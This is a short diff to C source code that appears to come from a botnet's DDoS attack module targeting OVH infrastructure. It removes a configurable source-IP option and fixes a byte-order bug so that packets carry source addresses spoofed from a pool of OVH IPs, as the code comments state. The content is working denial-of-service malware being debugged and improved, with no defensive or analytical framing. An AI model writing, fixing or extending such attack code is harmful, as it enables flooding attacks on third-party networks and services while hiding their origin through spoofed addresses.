@@ -66,7 +66,6 @@ void attack_ovh(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len
     port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
     int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
     int pps_limiter = attack_get_opt_int(opts_len, opts, ATK_OPT_PPS, 0);
-    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
 
     // Large pool of OVH source IPs for spoofing
     uint32_t ovh_ips[] = {
@@ -141,8 +140,8 @@ void attack_ovh(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len
             sin.sin_addr.s_addr = targs[i].addr;
             sin.sin_port = htons(dport);
 
-            // Randomize source IP from OVH pool
-            iph->saddr = htonl(ovh_ips[ovh_rand() % num_ovh_ips]);
+            // Randomize source IP from OVH pool (values are already in network byte order)
+            iph->saddr = ovh_ips[ovh_rand() % num_ovh_ips];
 
             // Randomize source port
             if (sport == 0xffff)
